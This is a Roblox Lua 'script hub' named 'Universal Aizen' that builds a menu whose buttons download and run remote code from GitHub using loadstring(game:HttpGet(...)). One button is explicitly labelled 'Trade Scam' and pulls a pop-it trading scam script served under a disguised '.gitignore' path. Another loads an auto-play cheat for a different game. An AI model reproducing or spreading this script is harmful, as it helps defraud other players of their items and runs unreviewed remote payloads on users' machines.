-- Load Kavo UI Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Universal Aizen", "DarkTheme") -- Changed to "DarkTheme" for a clean look

-- Create Main UI Tab
local Tab = Window:NewTab("Aizen Hub")
local Section = Tab:NewSection("Scripts")

Section:NewLabel("Welcome to Universal Aizen!")

-- **Pop It Trading Script**
Section:NewButton("Pop It Trading", "Trade Scam", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore"))()
    print("Pop It Trading script executed!")
end)

-- **Blue Lock Rivals Script**
Section:NewButton("Blue Lock Rivals", "Auto Play Script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals"))()
    print("Blue Lock Rivals script executed!")
end)

-- **Auto Draggable UI**
Library:ToggleUI() -- This makes it draggable automatically on mobile & PC

print("Universal Aizen Loaded Successfully!")
